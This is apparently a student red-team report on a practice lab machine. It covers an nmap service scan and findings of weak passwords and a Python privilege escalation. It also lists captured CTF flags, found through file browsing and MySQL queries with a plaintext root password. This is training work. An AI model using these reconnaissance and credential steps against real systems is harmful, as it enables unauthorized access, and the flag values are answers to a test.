# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV 192.168.1.110
 ```
 
  ![nmap scan](https://github.com/chefesteve/Final_Project/blob/main/screens/red_team/target_1_nmap_scan.png)

This scan identifies the services below as potential points of entry:
- Target 1
  - port 22-ssh
  - port 80-http
  - port 111-rpcbind
  - ports 139 and 445-netbios


The following vulnerabilities were identified on each target:
- Target 1
  - Pings not blocked
  - Comically insecure passwords
  - Python bug that allows root privilege escalation

 ![WPScan](https://github.com/chefesteve/Final_Project/blob/main/screens/red_team/wordpress_enumeration_scan.png)
 
 ![metasploit scan](https://github.com/chefesteve/Final_Project/blob/main/screens/red_team/meta_scan.png)
 
 ![Python Root](https://github.com/chefesteve/Final_Project/blob/main/screens/red_team/python_root.png)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: flag1{b9bbcb33e11b80be759c4e844862428d}
    - **Exploit Used**
      - Weak password
      - cd /var/www/html
	  - nano service.html
	  - ![flag1](https://github.com/chefesteve/Final_Project/blob/main/screens/red_team/flag_1.png)
  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Exploit Used**
      - Weak password
      - cd /var/www
	  - nano flag2.txt
	  - ![flag2](https://github.com/chefesteve/Final_Project/blob/main/screens/red_team/flag_2.png)
  - 'flag3.txt': flag3{afc01ab56b50591e7dccf93122770cd2}
	- **Exploit Used**
	  - Weak password
	  - mysql -u root -pR@v3nSecurity
	  - use wordpress;
	  - select * from wp_posts;
	  - ![flag3](https://github.com/chefesteve/Final_Project/blob/main/screens/red_team/flag_3.png)
  - 'flag4.txt': flag4{715dea6c055b9fe3337544932f2941ce}
    - **Exploit Used**
	  - Weak password
	  - mysql -u root -pR@v3nSecurity
	  - use wordpress;
	  - select * from wp_posts;
	  - ![flag4](https://github.com/chefesteve/Final_Project/blob/main/screens/red_team/flag_4.png)
